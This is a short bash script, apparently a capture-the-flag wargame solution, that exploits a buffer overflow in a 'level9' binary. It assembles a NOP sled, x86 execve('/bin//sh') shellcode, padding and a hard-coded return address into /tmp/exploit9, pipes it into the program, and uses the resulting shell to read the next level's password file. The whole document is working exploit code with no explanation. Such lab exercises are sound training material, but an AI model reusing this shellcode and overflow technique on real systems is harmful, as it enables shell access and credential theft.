#!/bin/bash

GETPASS="cat /home/user/bonus0/.pass"

set -x

NOPSLED=`python -c 'print("\x90" * 40)'`
SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
PADDING=`python -c 'print("A" * 40)'` # OFFSET=108 - SHELLCODE_LENGTH=28
RETADDRESS="\x0c\xa0\x04\x08"

python -c "print('$NOPSLED' + '$SHELLCODE' + '$PADDING' + '$RETADDRESS')" > /tmp/exploit9

(cat /tmp/exploit9 - | ~/level9) << EOI
    echo "\nwhoami: \$(whoami)"
    echo "Next pass is:  \$($GETPASS)\n"
EOI
